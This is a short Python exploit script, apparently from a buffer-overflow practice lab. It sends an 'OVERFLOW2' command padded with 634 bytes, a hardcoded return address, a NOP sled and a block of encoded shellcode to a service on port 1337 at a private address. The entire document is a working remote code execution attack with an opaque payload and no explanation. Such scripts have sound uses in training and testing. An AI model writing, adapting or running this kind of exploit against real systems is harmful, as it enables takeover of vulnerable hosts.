#!/usr/bin/env python3

import socket

ip = "10.10.193.216"
port = 1337

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
# 625011AF
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xfc\xbb\xa1\x77\xcc\x08\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x9f\x4e\x08\x9d"
"\x60\x2f\x80\x78\x51\x6f\xf6\x09\xc2\x5f\x7c\x5f\xef\x14\xd0"
"\x4b\x64\x58\xfd\x7c\xcd\xd7\xdb\xb3\xce\x44\x1f\xd2\x4c\x97"
"\x4c\x34\x6c\x58\x81\x35\xa9\x85\x68\x67\x62\xc1\xdf\x97\x07"
"\x9f\xe3\x1c\x5b\x31\x64\xc1\x2c\x30\x45\x54\x26\x6b\x45\x57"
"\xeb\x07\xcc\x4f\xe8\x22\x86\xe4\xda\xd9\x19\x2c\x13\x21\xb5"
"\x11\x9b\xd0\xc7\x56\x1c\x0b\xb2\xae\x5e\xb6\xc5\x75\x1c\x6c"
"\x43\x6d\x86\xe7\xf3\x49\x36\x2b\x65\x1a\x34\x80\xe1\x44\x59"
"\x17\x25\xff\x65\x9c\xc8\x2f\xec\xe6\xee\xeb\xb4\xbd\x8f\xaa"
"\x10\x13\xaf\xac\xfa\xcc\x15\xa7\x17\x18\x24\xea\x7f\xed\x05"
"\x14\x80\x79\x1d\x67\xb2\x26\xb5\xef\xfe\xaf\x13\xe8\x01\x9a"
"\xe4\x66\xfc\x25\x15\xaf\x3b\x71\x45\xc7\xea\xfa\x0e\x17\x12"
"\x2f\x80\x47\xbc\x80\x61\x37\x7c\x71\x0a\x5d\x73\xae\x2a\x5e"
"\x59\xc7\xc1\xa5\x0a\xe2\x18\xbc\x38\x9a\x20\xbe\xad\x07\xac"
"\x58\xa7\xa7\xf8\xf3\x50\x51\xa1\x8f\xc1\x9e\x7f\xea\xc2\x15"
"\x8c\x0b\x8c\xdd\xf9\x1f\x79\x2e\xb4\x7d\x2c\x31\x62\xe9\xb2"
"\xa0\xe9\xe9\xbd\xd8\xa5\xbe\xea\x2f\xbc\x2a\x07\x09\x16\x48"
"\xda\xcf\x51\xc8\x01\x2c\x5f\xd1\xc4\x08\x7b\xc1\x10\x90\xc7"
"\xb5\xcc\xc7\x91\x63\xab\xb1\x53\xdd\x65\x6d\x3a\x89\xf0\x5d"
"\xfd\xcf\xfc\x8b\x8b\x2f\x4c\x62\xca\x50\x61\xe2\xda\x29\x9f"
"\x92\x25\xe0\x1b\xb2\xc7\x20\x56\x5b\x5e\xa1\xdb\x06\x61\x1c"
"\x1f\x3f\xe2\x94\xe0\xc4\xfa\xdd\xe5\x81\xbc\x0e\x94\x9a\x28"
"\x30\x0b\x9a\x78\x30\xab\x64\x83")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")